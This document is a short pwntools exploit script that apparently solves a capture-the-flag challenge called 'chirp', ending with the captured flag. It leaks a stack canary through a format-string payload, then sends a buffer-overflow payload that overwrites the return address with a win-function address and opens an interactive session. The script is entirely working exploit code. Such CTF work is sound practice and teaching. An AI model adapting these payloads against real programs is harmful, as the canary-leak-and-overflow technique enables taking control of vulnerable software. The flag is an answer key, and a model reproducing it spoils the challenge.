from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

# 1. leak content of static file "canary.bin"
p = remote('chirp.challs.pwnoh.io', 1337, ssl=True)
p.sendlineafter(b"Enter name: ", b'%9$p')
p.recvuntil(b"Hello, ")
canary_val = int(p.recvline().strip(), 16)
log.info(f"canary value: {hex(canary_val)}")
p.close()

# 2. overwrite return address with win function address
p = remote('chirp.challs.pwnoh.io', 1337, ssl=True)
p.sendlineafter(b"Enter name: ", b'A'*0x18+p64(canary_val)+b'A'*8+p64(0x4011b6))

p.interactive()

# bctf{r3Al_pR0gramm3rs_d0n7_Wr1t3_th31R_0wn_cRypTo} 